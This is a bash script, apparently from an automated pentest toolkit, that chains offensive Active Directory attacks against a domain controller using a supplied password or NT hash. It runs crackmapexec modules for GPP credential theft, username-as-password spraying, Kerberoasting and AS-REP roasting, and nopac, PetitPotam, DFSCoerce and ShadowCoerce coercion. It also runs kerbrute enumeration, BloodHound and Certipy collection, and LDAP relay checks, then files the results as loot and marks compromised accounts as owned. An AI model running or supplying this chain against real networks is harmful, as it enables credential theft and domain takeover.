#!/bin/bash
# shellcheck disable=SC2034
#Colors
RED='\033[1;31m'
GREEN='\033[1;32m'
CYAN='\033[1;36m'
BLUE='\033[1;34m'
YELLOW='\033[1;33m'
PURPLE='\033[1;35m'
NC='\033[0m'

figlet UserChecks

echo -e "${PURPLE}CME is still buggy u need to press ENTER sometimes!${NC}"
unset USER HASH PASS DOM IP FQDN BHDOM

read -r -p "Username: " USER
echo -e "${RED}leave Password EMPTY for Hash usage!${NC}"
read -r -p "Password: " PASS
if [ -z "$PASS" ]; then
  read -r -p "NT Hash: " HASH
  #check for valide NTHASH
  if [ ${#HASH} != 32 ]; then
    echo -e "${RED}No Password AND"
    echo -e "Wrong hash Format${NC}, just NT HASH"
    exit 1
  fi
fi
read -r -p "Domain: " DOM
read -r -p "IP DomainController: " IP

#Check for valide IP
if [[ $IP =~ ^[0-9]+(\.[0-9]+){3}$ ]]; then
  echo "DC IP is: ""$IP"
else
  echo -e "${RED}Wrong IP Format${NC}"
  exit 1
fi

# get DC_FQDN
FQDN=$(nslookup "$IP" "$IP" | awk '/name/ {print$4}' | sed 's/.$//')
# Domain all uppercase for BH query
BHDOM=$(echo "$DOM" | tr '[:lower:]' '[:upper:]')

# Python unbuffered for output
#export PYTHONUNBUFFERED=TRUE

{
  echo "CME user unauthenticated"
  date
} >>/root/output/runtime.txt
echo "CME user unauthenticated"
crackmapexec smb "$IP" --users --log /root/output/loot/smb/anonymous_enumeration/"$IP"_unauthenticated.txt >/dev/null 2>&1

{
  echo "CME PetitPotam unauthenticated"
  date
} >>/root/output/runtime.txt
echo "CME PetitPotam unauthenticated"
crackmapexec smb "$IP" -M petitpotam --log /root/output/loot/rpc/petit_potam/"$IP"_unauthenticated.txt >/dev/null 2>&1

if [ -n "$PASS" ]; then
  # Use Password
  {
    echo "CME GPP_Password"
    date
  } >>/root/output/runtime.txt
  # GPP password
  echo "CME GPP_Password"
  crackmapexec smb "$IP" -u "$USER" -p "$PASS" -d "$DOM" -M gpp_password --log /root/output/loot/ad/gpp_password/pass_"$DOM".txt >/dev/null 2>&1

  {
    echo "CME GPP_Autologin"
    date
  } >>/root/output/runtime.txt
  # GPP autologin
  echo "CME GPP_Autologin"
  crackmapexec smb "$IP" -u "$USER" -p "$PASS" -d "$DOM" -M gpp_autologin --log /root/output/loot/ad/gpp_autologin/login_"$DOM".txt >/dev/null 2>&1

  {
    echo "CME username_as_pass"
    date
  } >>/root/output/runtime.txt
  # User txt from DC
  echo "CME username_as_pass"
  crackmapexec smb "$IP" -u "$USER" -p "$PASS" -d "$DOM" --users --log /root/output/list/raw.txt >/dev/null 2>&1
  # shellcheck disable=SC1003
  awk '/445/ {print$5}' /root/output/list/raw.txt | cut -d '\' -f 2 | grep -v 'HealthMailbox' | sed '/\x1b\[[0-9;]*[mGKHF]/d' >/root/output/list/user.txt
  #rm /root/output/list/raw.txt
  crackmapexec smb "$IP" -u /root/output/list/user.txt -p /root/output/list/user.txt --no-bruteforce --continue-on-success --log /root/output/loot/ad/iam/user_as_pass/raw_"$DOM".txt >/dev/null 2>&1

  {
    echo "kerbrute userenum"
    date
  } >>/root/output/runtime.txt
  # Kerbrute
  echo "kerbrute userenum"
  kerbrute userenum /root/output/list/user.txt -d "$DOM" >>/root/output/loot/ad/kerberos/user_enum/kerbrute_"$DOM".txt 2>&1

  {
    echo "CME Shares"
    date
  } >>/root/output/runtime.txt
  echo "CME Shares"
  crackmapexec smb /root/output/list/smb_open.txt -u "$USER" -p "$PASS" -d "$DOM" --shares --log /root/output/loot/smb/cme_auth_raw_shares.txt >/dev/null 2>&1

  {
    echo "CME Pass-Pol"
    date
  } >>/root/output/runtime.txt
  # Password policy
  echo "CME Pass-Pol"
  crackmapexec smb "$IP" -u "$USER" -p "$PASS" -d "$DOM" --pass-pol --log /root/output/loot/ad/iam/passpol/pol_"$DOM".txt >/dev/null 2>&1

  {
    echo "CME nopac"
    date
  } >>/root/output/runtime.txt
  # nopac
  echo "CME nopac"
  crackmapexec smb "$IP" -u "$USER" -p "$PASS" -d "$DOM" -M nopac --log /root/output/loot/ldap/nopac/nopac_"$FQDN".txt >/dev/null 2>&1

  {
    echo "CME Petit Potam"
    date
  } >>/root/output/runtime.txt
  # petitpotam
  echo "CME Petit Potam"
  crackmapexec smb "$IP" -u "$USER" -p "$PASS" -d "$DOM" -M petitpotam --log /root/output/loot/rpc/petit_potam/petitpotam_"$FQDN".txt >/dev/null 2>&1

  {
    echo "CME DFScoerce"
    date
  } >>/root/output/runtime.txt
  # DFScoerce
  echo "CME DFScoerce"
  crackmapexec smb "$IP" -u "$USER" -p "$PASS" -d "$DOM" -M dfscoerce --log /root/output/loot/rpc/dfscoerce/dfscoerce_"$FQDN".txt >/dev/null 2>&1

  {
    echo "CME Shadowcoerce"
    date
  } >>/root/output/runtime.txt
  # Shadowcoerce
  echo "CME Shadowcoerce"
  crackmapexec smb "$IP" -u "$USER" -p "$PASS" -d "$DOM" -M shadowcoerce --log /root/output/loot/rpc/shadowcoerce/shadowcoerce_"$FQDN".txt >/dev/null 2>&1

  {
    echo "CME Sessions"
    date
  } >>/root/output/runtime.txt
  # sessions
  echo "CME Sessions"
  crackmapexec smb /root/output/list/smb_open.txt -u "$USER" -p "$PASS" -d "$DOM" --sessions --log /root/output/loot/ad/session/sessions_"$DOM".txt >/dev/null 2>&1

  {
    echo
    date
  } >>/root/output/runtime.txt
  # cme ntlmv1 check
  echo "CME ntlmv1 check"
  crackmapexec smb "$IP" -u "$USER" -p "$PASS" -d "$DOM" -M ntlmv1 --log /root/output/loot/ad/iam/ntlm_auth/ntlmv1_"$DOM".txt >/dev/null 2>&1

  {
    echo "CME ASRep"
    date
  } >>/root/output/runtime.txt
  # asreproast
  echo "CME ASRep"
  crackmapexec ldap "$FQDN" -u "$USER" -p "$PASS" -d "$DOM" --asreproast /root/output/loot/ad/kerberos/asreproast/asrep_"$DOM".txt --log /root/output/loot/ad/kerberos/asreproast/raw_"$DOM".txt >/dev/null 2>&1

  {
    echo "CME Kerberoast"
    date
  } >>/root/output/runtime.txt
  # kerberoast
  echo "CME Kerberoast"
  crackmapexec ldap "$FQDN" -u "$USER" -p "$PASS" -d "$DOM" --kerberoasting /root/output/loot/ad/kerberos/kerberoasting/krb_"$DOM".txt --log /root/output/loot/ad/kerberos/kerberoasting/raw_"$DOM".txt >/dev/null 2>&1

  {
    echo "CME MAQ"
    date
  } >>/root/output/runtime.txt
  # MAQ
  echo "CME MAQ"
  crackmapexec ldap "$FQDN" -u "$USER" -p "$PASS" -d "$DOM" -M MAQ --log /root/output/loot/ad/quota/maq_"$DOM".txt >/dev/null 2>&1

  {
    echo "CME MAQ PWSH"
    date
  } >>/root/output/runtime.txt
  # MAQ
  echo "CME MAQ PWSH"
  crackmapexec smb "$IP" -u "$USER" -p "$PASS" -d "$DOM" -X 'Get-ADObject ((Get-ADDomain).distinguishedname) -Properties ms-DS-MachineAccountQuota' --log /root/output/loot/ad/quota/pwsh_maq_"$DOM".txt >/dev/null 2>&1

  {
    echo "MAQ python"
    date
  } >>/root/output/runtime.txt
  # MAQ
  echo "MAQ python"
  python3 /opt/auto_pt/resources/maq.py "$DOM"/"$USER":"$PASS" -dc-ip "$IP" >>/root/output/loot/ad/quota/pymaq_"$DOM".txt 2>&1
  echo "MAQ python ldaps"
  python3 /opt/auto_pt/resources/maq.py "$DOM"/"$USER":"$PASS" -dc-ip "$IP" -use-ldaps >>/root/output/loot/ad/quota/pymaq_"$DOM".txt 2>&1

  {
    echo "CME LDAP Checker"
    date
  } >>/root/output/runtime.txt
  # CME Ldap signing
  echo "CME LDAP Checker"
  crackmapexec ldap "$FQDN" -u "$USER" -p "$PASS" -d "$DOM" -M ldap-checker --log /root/output/loot/ldap/ldap_check_"$DOM".txt >/dev/null 2>&1

  {
    echo "CME LDAP Signing"
    date
  } >>/root/output/runtime.txt
  # CME Ldap signing
  echo "CME LDAP Signing"
  crackmapexec ldap "$FQDN" -u "$USER" -p "$PASS" -d "$DOM" -M ldap-signing --log /root/output/loot/ldap/ldap_sign_"$DOM".txt >/dev/null 2>&1

  {
    echo "LdapRelayScan LDAP Signing"
    date
  } >>/root/output/runtime.txt
  # ldap signing
  echo "LdapRelayScan LDAP Signing"
  python3 /opt/LdapRelayScan/LdapRelayScan.py -u "$USER" -p "$PASS" -dc-ip "$IP" -method BOTH >>/root/output/loot/ldap/signig_"$DOM".txt 2>&1

  {
    echo "Bloodhound"
    date
  } >>/root/output/runtime.txt
  # bloodhound
  echo "Bloodhound"
  bloodhound-python -u "$USER" -p "$PASS" -d "$DOM" -dc "$FQDN" -w 50 -c all --zip

  {
    echo "Certipy OLD"
    date
  } >>/root/output/runtime.txt
  # certipy
  echo "Certipy OLD"
  certipy find -u "$USER" -p "$PASS" -target "$IP" -old-bloodhound
fi

if [ -n "$HASH" ]; then
  # use HASH

  {
    echo "CME GPP_Password"
    date
  } >>/root/output/runtime.txt
  # GPP password
  echo "CME GPP_Password"
  crackmapexec smb "$IP" -u "$USER" -H "$HASH" -d "$DOM" -M gpp_password --log /root/output/loot/ad/gpp_password/pass_"$DOM".txt >/dev/null 2>&1

  {
    echo "CME GPP_Autologin"
    date
  } >>/root/output/runtime.txt
  # GPP autologin
  echo "CME GPP_Autologin"
  crackmapexec smb "$IP" -u "$USER" -H "$HASH" -d "$DOM" -M gpp_autologin --log /root/output/loot/ad/gpp_autologin/login_"$DOM".txt >/dev/null 2>&1

  {
    echo "CME username_as_pass"
    date
  } >>/root/output/runtime.txt
  # User txt from DC
  echo "CME username_as_pass"
  crackmapexec smb "$IP" -u "$USER" -H "$HASH" -d "$DOM" --users --log /root/output/list/raw.txt >/dev/null 2>&1
  # shellcheck disable=SC1003
  awk '/445/ {print$5}' /root/output/list/raw.txt | cut -d '\' -f 2 | grep -v 'HealthMailbox' | sed '/\x1b\[[0-9;]*[mGKHF]/d' >/root/output/list/user.txt
  rm /root/output/list/raw.txt
  crackmapexec smb "$IP" -u /root/output/list/user.txt -p /root/output/list/user.txt --no-bruteforce --continue-on-success --log /root/output/loot/ad/iam/user_as_pass/raw_"$DOM".txt >/dev/null 2>&1

  {
    echo "kerbrute userenum"
    date
  } >>/root/output/runtime.txt
  # Kerbrute
  echo "kerbrute userenum"
  kerbrute userenum /root/output/list/user.txt -d "$DOM" >>/root/output/loot/ad/kerberos/user_enum/kerbrute_"$DOM".txt 2>&1

  {
    echo "CME Shares"
    date
  } >>/root/output/runtime.txt
  echo "CME Shares"
  crackmapexec smb /root/output/list/smb_open.txt -u "$USER" -H "$HASH" -d "$DOM" --shares --log /root/output/loot/smb/cme_auth_raw_shares.txt >/dev/null 2>&1

  {
    echo "CME Pass-Pol"
    date
  } >>/root/output/runtime.txt
  # Password policy
  echo "CME Pass-Pol"
  crackmapexec smb "$IP" -u "$USER" -H "$HASH" -d "$DOM" --pass-pol --log /root/output/loot/ad/iam/passpol/pol_"$DOM".txt >/dev/null 2>&1

  {
    echo "CME nopac"
    date
  } >>/root/output/runtime.txt
  # nopac
  echo "CME nopac"
  crackmapexec smb "$IP" -u "$USER" -H "$HASH" -d "$DOM" -M nopac --log /root/output/loot/ldap/nopac/nopac_"$FQDN".txt >/dev/null 2>&1

  {
    echo "CME Petit Potam"
    date
  } >>/root/output/runtime.txt
  # petitpotam
  echo "CME Petit Potam"
  crackmapexec smb "$IP" -u "$USER" -H "$HASH" -d "$DOM" -M petitpotam --log /root/output/loot/rpc/petit_potam/petitpotam_"$FQDN".txt >/dev/null 2>&1

  {
    echo "CME DFScoerce"
    date
  } >>/root/output/runtime.txt
  # DFScoerce
  echo "CME DFScoerce"
  crackmapexec smb "$IP" -u "$USER" -H "$HASH" -d "$DOM" -M dfscoerce --log /root/output/loot/rpc/dfscoerce/dfscoerce_"$FQDN".txt >/dev/null 2>&1

  {
    echo "CME Shadowcoerce"
    date
  } >>/root/output/runtime.txt
  # Shadowcoerce
  echo "CME Shadowcoerce"
  crackmapexec smb "$IP" -u "$USER" -H "$HASH" -d "$DOM" -M shadowcoerce --log /root/output/loot/rpc/shadowcoerce/shadowcoerce_"$FQDN".txt >/dev/null 2>&1

  {
    echo "CME Sessions"
    date
  } >>/root/output/runtime.txt
  # sessions
  echo "CME Sessions"
  crackmapexec smb /root/output/list/smb_open.txt -u "$USER" -H "$HASH" -d "$DOM" --sessions >>/root/output/loot/ad/session/sessions_"$FQDN".txt 2>&1

  {
    echo "CME ntlmv1 check"
    date
  } >>/root/output/runtime.txt
  # CME ntlmv1 check
  echo "CME ntlmv1 check"
  crackmapexec smb "$IP" -u "$USER" -H "$HASH" -d "$DOM" -M ntlmv1 --log /root/output/loot/ad/iam/ntlm_auth/ntlmv1_"$DOM".txt >/dev/null 2>&1

  {
    echo "CME ASRep"
    date
  } >>/root/output/runtime.txt
  # asreproast
  echo "CME ASRep"
  crackmapexec ldap "$FQDN" -u "$USER" -H "$HASH" -d "$DOM" --asreproast /root/output/loot/ad/kerberos/asreproast/asrep_"$DOM".txt --log /root/output/loot/ad/kerberos/asreproast/raw_"$DOM".txt >/dev/null 2>&1

  {
    echo "CME Kerberoast"
    date
  } >>/root/output/runtime.txt
  # kerberoast
  echo "CME Kerberoast"
  crackmapexec ldap "$FQDN" -u "$USER" -H "$HASH" -d "$DOM" --kerberoasting /root/output/loot/ad/kerberos/kerberoasting/krb_"$DOM".txt --log /root/output/loot/ad/kerberos/kerberoasting/raw_"$DOM".txt >/dev/null 2>&1

  {
    echo "CME MAQ"
    date
  } >>/root/output/runtime.txt
  # MAQ
  echo "CME MAQ"
  crackmapexec ldap "$FQDN" -u "$USER" -H "$HASH" -d "$DOM" -M MAQ --log /root/output/loot/ad/quota/maq_"$DOM".txt >/dev/null 2>&1

  {
    echo "CME MAQ PWSH"
    date
  } >>/root/output/runtime.txt
  # MAQ
  echo "CME MAQ PWSH"
  crackmapexec smb "$IP" -u "$USER" -H "$HASH" -d "$DOM" -X 'Get-ADObject ((Get-ADDomain).distinguishedname) -Properties ms-DS-MachineAccountQuota' --log /root/output/loot/ad/quota/pwsh_maq_"$DOM".txt >/dev/null 2>&1

  {
    echo "MAQ python"
    date
  } >>/root/output/runtime.txt
  # MAQ
  echo "MAQ python"
  python3 /opt/auto_pt/resources/maq.py "$DOM"/"$USER" -hashes aad3b435b51404eeaad3b435b51404ee:"$HASH" -dc-ip "$IP" >>/root/output/loot/ad/quota/pymaq_"$DOM".txt 2>&1
  echo "MAQ python ldaps"
  python3 /opt/auto_pt/resources/maq.py "$DOM"/"$USER" -hashes aad3b435b51404eeaad3b435b51404ee:"$HASH" -dc-ip "$IP" -use-ldaps >>/root/output/loot/ad/quota/pymaq_"$DOM".txt 2>&1

  {
    echo "CME LDAP Checker"
    date
  } >>/root/output/runtime.txt
  # CME Ldap signing
  echo "CME LDAP Checker"
  crackmapexec ldap "$FQDN" -u "$USER" -H "$HASH" -d "$DOM" -M ldap-checker --log /root/output/loot/ldap/ldap_check_"$DOM".txt >/dev/null 2>&1

  {
    echo "CME LDAP Signing"
    date
  } >>/root/output/runtime.txt
  # CME Ldap signing
  echo "CME LDAP Signing"
  crackmapexec ldap "$FQDN" -u "$USER" -H "$HASH" -d "$DOM" -M ldap-signing --log /root/output/loot/ldap/ldap_sign_"$DOM".txt >/dev/null 2>&1

  {
    echo "LdapRelayScan LDAP Signing"
    date
  } >>/root/output/runtime.txt
  # ldap signing
  echo "LdapRelayScan LDAP Signing"
  python3 /opt/LdapRelayScan/LdapRelayScan.py -u "$USER" -nthash "$HASH" -dc-ip "$IP" -method BOTH >>/root/output/loot/ldap/signig_"$DOM".txt 2>&1

  {
    echo "Bloodhound"
    date
  } >>/root/output/runtime.txt
  # bloodhound
  echo "Bloodhound"
  bloodhound-python -u "$USER" --hashes aad3b435b51404eeaad3b435b51404ee:"$HASH" -d "$DOM" -dc "$FQDN" -w 50 -c all --zip

  {
    echo "Certipy OLD"
    date
  } >>/root/output/runtime.txt
  # Certipy
  echo "Certipy OLD"
  certipy find -u "$USER" -hashes "$HASH" -target "$IP" -old-bloodhound
fi

# Looting
{
  echo "looting"
  date
} >>/root/output/runtime.txt
echo "Looting"
#BH and Certipy to intern AD
mv ./*.zip /root/output/loot/ad

# Kerbrute
awk '/VALID USERNAME/ {print$7}' /root/output/loot/ad/kerberos/user_enum/kerbrute_"$DOM".txt | sed 's/@.*//g' >/root/output/list/user_kerbrute_"$DOM".txt

# BH owned
grep '+' /root/output/loot/ad/iam/user_as_pass/raw_"$DOM".txt >/root/output/loot/ad/iam/user_as_pass/user_"$DOM".txt
# keep the raw file for screens and debugging
# BH owned User
awk '/\+/ {print$6}' /root/output/loot/ad/iam/user_as_pass/user_"$DOM".txt | cut -d : -f 2 | sort -u | tr '[:lower:]' '[:upper:]' >/root/output/loot/ad/iam/user_as_pass/owneduser.txt

for i in $(cat /root/output/loot/ad/iam/user_as_pass/owneduser.txt); do
  echo "MATCH (n) WHERE n.name = '""$i""@""$BHDOM""' SET n.owned=True SET n.UserNameAsPass=True SET n.plaintext=True;" >>/root/output/loot/ad/iam/user_as_pass/bh_owned.txt
done

# GPP AutoLogin
awk '/Found credentials/ {print$2}' /root/output/loot/ad/gpp_autologin/login_"$DOM".txt | sort -u >/root/output/loot/ad/gpp_autologin/host.txt
if [ -s /root/output/loot/ad/gpp_autologin/host.txt ]; then
  {
    echo "GPP_Autologin"
    awk '/Found credentials in/ {print$2}' /root/output/loot/ad/gpp_autologin/login_"$DOM".txt | sort -u
  } >>/root/output/findings.txt
  echo '' >>/root/output/findings.txt
fi

# GPP Passwords
awk '/Found credentials in/ {print$2}' /root/output/loot/ad/gpp_password/pass_"$DOM".txt | sort -u >/root/output/loot/ad/gpp_password/host.txt
if [ -s /root/output/loot/ad/gpp_password/host.txt ]; then
  echo "GPP_Password" >>/root/output/findings.txt
  awk '/Found credentials in/ {print$2}' /root/output/loot/ad/gpp_password/pass_"$DOM".txt | sort -u >>/root/output/findings.txt
fi

#Shares
grep 'READ' /root/output/loot/smb/cme_auth_raw_shares.txt | grep -v 'IPC\$\|print\$' >/root/output/loot/smb/auth_read_shares.txt
grep 'WRITE' /root/output/loot/smb/cme_auth_raw_shares.txt | grep -v 'IPC\$\|print\$' >/root/output/loot/smb/auth_write_shares.txt

#Local Admin
grep 'Pwn3d' /root/output/loot/smb/cme_auth_raw_shares.txt >/root/output/loot/ad/local_admin/cme_admin_raw.txt
if [ -s /root/output/loot/ad/local_admin/cme_admin_raw.txt ]; then
  figlet 'Local Admin Found'
  figlet 'Local Admin Found' >>/root/output/runtime.txt
fi

#LDAP Signing
grep '+.*SERVER SIGNING' -B 4 /root/output/loot/ldap/signig_"$DOM".txt | grep -v 'Unexpected error\|DeprecationWarning\|Checking DCs for LDAP\|ssl.wrap_socket' >/root/output/loot/ldap/signing/raw_"$DOM".txt
awk '/Signing NOT Enforced/ {print$4}' /root/output/loot/ldap/ldap_check_"$DOM".txt >/root/output/loot/ldap/signing/hosts.txt
if [[ -s /root/output/loot/ldap/signing/hosts.txt || -s /root/output/loot/ldap/signing/raw_"$DOM".txt ]]; then
  echo 'LDAP Signing' >>/root/output/findings.txt
  awk '/Signing NOT Enforced/ {print$4}' /root/output/loot/ldap/ldap_check_"$DOM".txt >>/root/output/findings.txt
fi

#LDAP ChannelBinding
grep '+.*CHANNEL BINDING' -B 4 /root/output/loot/ldap/signig_"$DOM".txt | grep -v 'Unexpected error\|DeprecationWarning\|Checking DCs for LDAP\|ssl.wrap_socket' >/root/output/loot/ldap/channel_binding/raw_"$DOM".txt
awk '/Channel Binding is set to "NEVER"/ {print$4}' /root/output/loot/ldap/ldap_check_"$DOM".txt >/root/output/loot/ldap/channel_binding/hosts.txt
if [[ -s /root/output/loot/ldap/channel_binding/hosts.txt || -s /root/output/loot/ldap/channel_binding/raw_"$DOM".txt ]]; then
  {
    echo 'LDAP Channel Binding'
    awk '/Channel Binding is set to "NEVER"/ {print$4}' /root/output/loot/ldap/channel_binding/ldap_check_"$DOM".txt
    echo ''
  } >>/root/output/findings.txt
  cp /root/output/loot/ldap/signing/signig_"$DOM".txt /root/output/loot/ldap/channel_binding/
fi

{
  echo "Userchecks Done"
  date
} >>/root/output/runtime.txt

figlet "Userchecks Done"

# Python unbuffered reset to default
#unset PYTHONUNBUFFERED
